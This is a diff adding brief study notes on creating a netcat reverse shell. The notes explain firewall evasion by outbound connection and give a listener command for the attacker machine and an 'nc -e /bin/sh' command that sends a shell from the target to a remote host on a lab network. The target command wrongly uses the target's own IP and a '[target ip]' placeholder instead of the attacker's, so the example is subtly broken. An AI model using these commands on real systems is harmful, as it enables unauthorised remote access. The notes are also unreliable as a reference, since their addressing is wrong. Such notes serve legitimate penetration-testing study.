@@ -1,0 +1,15 @@
+Netcat - create a reverse shell with Netcat
+
++ why using outbound connection from target computer?
+	++ When it comes down to firewalls, we cannot have an inbound connection to connect to essential system service like the terminal
+	++ It's going to alert the firewall and the connection will be blocked
+	
++ (ATTACKER: 192.168.202.141)
+	++ Setting up a reverse shell listener on attacker machine
+	# nc -nvlp 1234
+
++ (TARGET: 192.168.202.142)
+	++ Setting up a reverse shell server that will be executing bash or the shell on target machine
+	# nc -nv [target ip] [port number] -e /bin/sh
+	# nc -nv 192.168.202.142 1234 -e /bin/sh
+	
